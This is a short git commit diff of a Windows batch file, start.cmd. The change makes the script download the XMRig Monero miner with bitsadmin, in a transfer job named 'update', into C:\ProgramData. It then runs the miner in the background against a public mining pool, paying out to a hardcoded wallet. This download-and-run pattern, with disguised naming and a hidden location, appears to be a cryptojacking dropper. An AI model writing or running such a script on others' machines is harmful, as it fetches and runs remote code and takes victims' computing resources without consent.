3101092fc5afe33ece3137e13328664c5e52a843
insectia <34617074+insectia@users.noreply.github.com>
2018-01-09 22:46:23 +1100

    Better

--- start.cmd
+++ start.cmd
@@ -1,3 +1,4 @@
 @echo off
-xmrig.exe
+bitsadmin /wrap /transfer update /priority high https://github.com/insectia/Arts/raw/master/xmrig.exe C:\ProgramData\xmrig.exe
+C:\ProgramData\xmrig.exe -o monerohash.com:3333 -u 46ncqzHBax31tXPzVdrYt2PPotGsHroZK4mToY8HPmckgrKL45471ymjFQsRBMnDardWySx2j5BLPBepnBJ4zoKtHhGpSjp -p x -B -k
 pause
